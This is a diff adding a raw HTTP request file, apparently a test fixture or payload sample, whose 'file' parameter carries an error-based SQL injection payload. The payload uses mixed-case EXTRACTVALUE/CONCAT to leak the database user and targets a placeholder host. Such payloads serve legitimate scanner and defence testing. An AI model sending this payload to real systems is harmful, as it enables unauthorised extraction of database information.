@@ -1,0 +1,4 @@
+GET /a?file=1'%20aNd%20ExTrAcTvAlUe(1,CoNcAt(0X7e,UsEr()))%23 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
